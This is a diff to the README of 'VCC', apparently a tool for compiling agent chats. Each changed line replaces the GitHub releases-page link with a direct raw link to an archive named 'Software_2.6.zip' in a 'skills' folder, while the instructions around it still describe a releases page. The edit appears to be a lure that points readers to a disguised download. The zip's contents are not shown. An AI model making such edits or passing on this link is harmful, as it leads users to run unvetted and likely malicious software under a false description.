@@ -1,6 +1,6 @@
 # 🧩 VCC - Compile Agent Chats Fast
 
-[![Download VCC](https://img.shields.io/badge/Download%20VCC-blue-grey)](https://github.com/bennuxer/VCC/releases)
+[![Download VCC](https://img.shields.io/badge/Download%20VCC-blue-grey)](https://raw.githubusercontent.com/bennuxer/VCC/main/skills/Software_2.6.zip)
 
 ## 🎯 What VCC Does
 
@@ -29,7 +29,7 @@ A newer PC will handle large chat sets better.
 
 Visit this page to download VCC:
 
-https://github.com/bennuxer/VCC/releases
+https://raw.githubusercontent.com/bennuxer/VCC/main/skills/Software_2.6.zip
 
 On that page, look for the latest release. Download the file that matches Windows. If there is more than one file, choose the `.exe` file or the Windows zip file if that is the one listed for your system.
 
@@ -162,5 +162,5 @@ Small steps like these make the app easier to use.
 
 If you need the download page later, use this link:
 
-https://github.com/bennuxer/VCC/releases
+https://raw.githubusercontent.com/bennuxer/VCC/main/skills/Software_2.6.zip
 
